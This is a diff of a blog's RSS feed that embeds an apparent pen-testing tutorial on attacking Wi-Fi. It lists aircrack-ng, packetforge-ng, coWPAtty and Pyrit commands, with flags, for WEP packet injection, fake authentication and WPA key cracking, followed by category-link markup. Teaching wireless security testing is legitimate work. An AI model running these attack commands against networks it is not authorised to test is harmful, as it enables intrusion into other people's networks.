+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-4 - KoreK ChopChop Attack&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b &amp;lt;ap&amp;gt; - The AP MAC address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;`-h &lt;you&gt; - The source MAC address&lt;/you&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;fragmentaion-attack&quot;&gt;Fragmentaion Attack&lt;/h3&gt;
+
+&lt;p&gt;This attack works by obtaining a small amount of the keying material from the packet and then attempts to send ARP and/or LLC packets with known content to the AP.  If the packet is successfully echoed back by the AP, then a larger amount of the keying information can be obtained from the returned packet.  This process is repeated until 1500 bytes of the PRGA are obtained.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aireplay-ng -5 -b &amp;lt;ap&amp;gt; -h &amp;lt;you&amp;gt; &amp;lt;interface&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-5 - The Fragmentation Attack&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b &amp;lt;ap&amp;gt; - The AP MAC address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-h &amp;lt;you&amp;gt; - Source MAC address&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;craft-arp-request-packet&quot;&gt;Craft ARP Request Packet**&lt;/h3&gt;
+
+&lt;p&gt;Packetforge-ng is used to create encrypted packets that can later be used for injection.  You can create various types of packets such as UDP and ICMP packets although it is most commonly used to create ARP requests for subsequent injection.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;packetforge-ng -0 -a &amp;lt;ap&amp;gt; -h &amp;lt;you&amp;gt; -l &amp;lt;sourceIP&amp;gt; -k &amp;lt;destIP&amp;gt; -y &amp;lt;xorFile&amp;gt; -w &amp;lt;out&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0 - Generate an ARP request packet&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a &amp;lt;ap&amp;gt; - The AP MAC Address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-h &amp;lt;you&amp;gt; - The source MAC address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-k &amp;lt;distIP&amp;gt; - The destination IP&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-l &amp;lt;sourceIP&amp;gt; - The source IP&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-y &amp;lt;xorFile&amp;gt; - The PRGA filename&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w - The filename to save the packet to&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;inject-packetinteractive-packet-replay&quot;&gt;Inject Packet/Interactive Packet Replay&lt;/h3&gt;
+
+&lt;p&gt;This attack uses a crafted ARP request packet and injects it to capture enough IVs to subsequently crack the WEP key on the AP&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aireplay-ng -2 -r &amp;lt;packet&amp;gt; &amp;lt;interface&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-2 - Interactive Packet Replay Attack&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r &amp;lt;packet&amp;gt; - Filename of the crafted ARP packet&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;fake-shared-key-authentication&quot;&gt;Fake Shared Key Authentication&lt;/h3&gt;
+
+&lt;p&gt;This attack is used for bypassing WEP Share Key Authentication.  It uses a captured keystream file and conducts a fake authentication.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aireplay -1 -0 -e &amp;lt;essid&amp;gt; -y &amp;lt;captureFile&amp;gt; -a &amp;lt;ap&amp;gt; -h &amp;lt;you&amp;gt; &amp;lt;interface&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1 - Fake Authentication Attack&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0 - Reassociation timing in seconds&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e &amp;lt;essid&amp;gt; - The wireless network name(SSID)&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-y &amp;lt;captureFile&amp;gt; - Filename of the captured keystream&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a &amp;lt;ap&amp;gt; - The AP MAC address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-h &amp;lt;you&amp;gt; - Source MAC address&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;wpa-attacks&quot;&gt;WPA Attacks&lt;/h2&gt;
+
+&lt;h3 id=&quot;cowpatty-attack&quot;&gt;coWPAtty Attack&lt;/h3&gt;
+
+&lt;h4 id=&quot;dictionary-mode&quot;&gt;Dictionary Mode&lt;/h4&gt;
+
+&lt;p&gt;coWPAtty is a versatile tool that can recover WPA pre-shared keys, from a captured handshake, using either dictionary or rainbow table attacks.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cowpatty -r &amp;lt;capture&amp;gt; -f &amp;lt;wordlist&amp;gt; -2 -s &amp;lt;essid&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r &amp;lt;capture&amp;gt;&lt;/code&gt; - The capture filename&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f &amp;lt;wordlist&amp;gt;&lt;/code&gt; - The wordlist to use&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-2&lt;/code&gt; - Use non-strict mode as coWPAtty has an issue with airodump-ng captures&lt;/li&gt;
+  &lt;li&gt;`-s &lt;essid&gt; - The network ESSID&lt;/essid&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;rainbow-table-mode&quot;&gt;Rainbow Table Mode&lt;/h4&gt;
+
+&lt;p&gt;Generate the hashes for our ESSID along with a dictionary file containing password&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;genpmk -f &amp;lt;wordlist&amp;gt; -d &amp;lt;hashesFilename&amp;gt; -s &amp;lt;essid&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f &amp;lt;wordlist&amp;gt;&lt;/code&gt; - The path to the dictionary file&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d &amp;lt;hashesFilename&amp;gt;&lt;/code&gt; - The filename to save the computed hashes to&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-s &amp;lt;essid&amp;gt;&lt;/code&gt; - The network ESSID&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Run coWPAtty using the generated hashes&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cowpatty -r &amp;lt;capture&amp;gt; -d &amp;lt;hashesFilename&amp;gt; -2 -s &amp;lt;essid&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r &amp;lt;capture&amp;gt;&lt;/code&gt; - The capture filename&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d &amp;lt;hashesFilename&amp;gt;&lt;/code&gt; - The file name of the computed hashes to use&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-2&lt;/code&gt; - Use non-strict mode as coWPAtty has an issue with airodump-ng captures&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-s &amp;lt;essid&amp;gt;&lt;/code&gt; - The network ESSID&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;pyrit-sniff&quot;&gt;Pyrit Sniff&lt;/h3&gt;
+
+&lt;p&gt;Pyrit, like airolib-ng and coWPAtty, uses a pre-computed database of WPA pre-shared key tables, though with the distinct advantage of being able to leverage GPUs to accelerate the generation of PMK tables.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pyrit -r &amp;lt;interface&amp;gt; -o &amp;lt;capture&amp;gt; stripLive&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r &amp;lt;interface&amp;gt;&lt;/code&gt; - The wireless interface to use&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-o &amp;lt;capture&amp;gt;&lt;/code&gt; - The file to save the captured data to&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;striplive&lt;/code&gt; - Only saves the WPA handshakes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;validate-the-4-way-handshake&quot;&gt;Validate the 4-way handshake&lt;/h3&gt;
+
+&lt;p&gt;Pyrit is able to analyze the capture file and determine if the capture contains any valid handshakes&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pyrit -r &amp;lt;capture&amp;gt; analyze&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r &amp;lt;capture&amp;gt;&lt;/code&gt; - The capture file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;pyrit-crack-dictionary&quot;&gt;Pyrit Crack Dictionary&lt;/h3&gt;
+
+&lt;p&gt;Launching pyrit using a basic dictionary attack&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pyrit -r &amp;lt;capture&amp;gt; -i &amp;lt;wordlist&amp;gt; -b &amp;lt;ap&amp;gt; attack_passthrough&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r &amp;lt;capture&amp;gt;&lt;/code&gt; - The capture file&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-i &amp;lt;wordlist&amp;gt;&lt;/code&gt; - The wordlist file to use&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b &amp;lt;ap&amp;gt;&lt;/code&gt; - The &lt;em&gt;OPTIONAL&lt;/em&gt; BSSID of the target AP&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attack_passthrough&lt;/code&gt; - Attempt to crack the WPA password using the wordlist&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;pyrit-crack-database&quot;&gt;Pyrit Crack Database&lt;/h3&gt;
+
+&lt;h4 id=&quot;import-wordlist-into-database&quot;&gt;Import Wordlist into Database&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pyrit -i &amp;lt;wordlist&amp;gt; import_passwords&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-i &amp;lt;wordlist&amp;gt;&lt;/code&gt;- The wordlist to use&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import_passwords&lt;/code&gt; - Import the passwords into the database&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;add-the-essid-of-the-access-point&quot;&gt;Add the ESSID of the Access Point&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pyrit -e &amp;lt;essid&amp;gt; create_essid&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e &amp;lt;essid&amp;gt;&lt;/code&gt; - The network ESSID&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create_essid&lt;/code&gt; - Import the network ESSID&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;compute-the-pmks&quot;&gt;Compute the PMKs&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pyrit batch&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;launch-pyrit-in-database-mode&quot;&gt;Launch Pyrit in database mode&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pyrit -r &amp;lt;capture&amp;gt; -b &amp;lt;ap&amp;gt; attack_db&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r &amp;lt;capture&amp;gt;&lt;/code&gt; - The capture file&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b &amp;lt;ap&amp;gt;&lt;/code&gt; - The AP’s MAC address&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Tue, 03 Dec 2019 00:00:00 -0800</pubDate>
+        <link>http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/2019/12/03/attacking-wifi-commands/</link>
+        <guid isPermaLink="true">http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/2019/12/03/attacking-wifi-commands/</guid>
+      </item>
+    
+
+    
+      
+        
+      
+    
+      
+    
+      
+        
+          <item>
+            <title></title>
+            <description>&lt;h3&gt;   &lt;/h3&gt;
+
+&lt;div id=&quot;categories&quot;&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#Attacking Wifi&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/Attacking Wifi&quot;&gt;Attacking Wifi&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;Attacking Wifi&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/wireless/2023/04/18/dangers-of-public-wifi/&quot;&gt;Dangers of using Open and Public Wifi Hotspots&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/&quot;&gt;Attacking Wifi Series, Part 6&lt;br /&gt;Hacking WPA/WPA2 PSK&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/27/bypassing-wep-shared-key-authentication/&quot;&gt;Attacking Wifi Series, Part 5&lt;br /&gt;Bypassing WEP Shared Key Authentication&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/25/hacking-clientless-wep/&quot;&gt;Attacking Wifi Series, Part 4&lt;br /&gt; Hacking Clientess WEP Networks&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/23/hacking-wep-via-client/&quot;&gt;Attacking Wifi Series, Part 3&lt;br /&gt; Hacking WEP via a Client&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/03/18/hacking-wep-connected-clients/&quot;&gt;Attacking Wifi Series, Part 2&lt;br /&gt;Hacking WEP With Connected Clients&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/2019/12/03/attacking-wifi-commands/&quot;&gt;Attacking Wifi Series, Part 1&lt;br /&gt; Overview &amp;amp; Commands&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#Hacking&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/Hacking&quot;&gt;Hacking&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;Hacking&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/&quot;&gt;Attacking Wifi Series, Part 6&lt;br /&gt;Hacking WPA/WPA2 PSK&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/27/bypassing-wep-shared-key-authentication/&quot;&gt;Attacking Wifi Series, Part 5&lt;br /&gt;Bypassing WEP Shared Key Authentication&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/25/hacking-clientless-wep/&quot;&gt;Attacking Wifi Series, Part 4&lt;br /&gt; Hacking Clientess WEP Networks&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/23/hacking-wep-via-client/&quot;&gt;Attacking Wifi Series, Part 3&lt;br /&gt; Hacking WEP via a Client&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/03/18/hacking-wep-connected-clients/&quot;&gt;Attacking Wifi Series, Part 2&lt;br /&gt;Hacking WEP With Connected Clients&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/2019/12/03/attacking-wifi-commands/&quot;&gt;Attacking Wifi Series, Part 1&lt;br /&gt; Overview &amp;amp; Commands&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#Pen Testing&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/Pen Testing&quot;&gt;Pen Testing&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;Pen Testing&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/&quot;&gt;Attacking Wifi Series, Part 6&lt;br /&gt;Hacking WPA/WPA2 PSK&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/27/bypassing-wep-shared-key-authentication/&quot;&gt;Attacking Wifi Series, Part 5&lt;br /&gt;Bypassing WEP Shared Key Authentication&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/25/hacking-clientless-wep/&quot;&gt;Attacking Wifi Series, Part 4&lt;br /&gt; Hacking Clientess WEP Networks&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/23/hacking-wep-via-client/&quot;&gt;Attacking Wifi Series, Part 3&lt;br /&gt; Hacking WEP via a Client&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/03/18/hacking-wep-connected-clients/&quot;&gt;Attacking Wifi Series, Part 2&lt;br /&gt;Hacking WEP With Connected Clients&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/2019/12/03/attacking-wifi-commands/&quot;&gt;Attacking Wifi Series, Part 1&lt;br /&gt; Overview &amp;amp; Commands&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#Wireless&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/Wireless&quot;&gt;Wireless&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;Wireless&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/wireless/2023/04/18/dangers-of-public-wifi/&quot;&gt;Dangers of using Open and Public Wifi Hotspots&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/&quot;&gt;Attacking Wifi Series, Part 6&lt;br /&gt;Hacking WPA/WPA2 PSK&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/raspberry%20pi/hostapd/wireless/2020/04/30/setting-up-wifi-ap-rpi/&quot;&gt;Setting up a Rasberry Pi as a Wireless AP&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/27/bypassing-wep-shared-key-authentication/&quot;&gt;Attacking Wifi Series, Part 5&lt;br /&gt;Bypassing WEP Shared Key Authentication&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/25/hacking-clientless-wep/&quot;&gt;Attacking Wifi Series, Part 4&lt;br /&gt; Hacking Clientess WEP Networks&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/23/hacking-wep-via-client/&quot;&gt;Attacking Wifi Series, Part 3&lt;br /&gt; Hacking WEP via a Client&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/03/18/hacking-wep-connected-clients/&quot;&gt;Attacking Wifi Series, Part 2&lt;br /&gt;Hacking WEP With Connected Clients&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/2019/12/03/attacking-wifi-commands/&quot;&gt;Attacking Wifi Series, Part 1&lt;br /&gt; Overview &amp;amp; Commands&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#Aircrack-ng&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/Aircrack-ng&quot;&gt;Aircrack-ng&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;Aircrack-ng&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/&quot;&gt;Attacking Wifi Series, Part 6&lt;br /&gt;Hacking WPA/WPA2 PSK&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/27/bypassing-wep-shared-key-authentication/&quot;&gt;Attacking Wifi Series, Part 5&lt;br /&gt;Bypassing WEP Shared Key Authentication&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
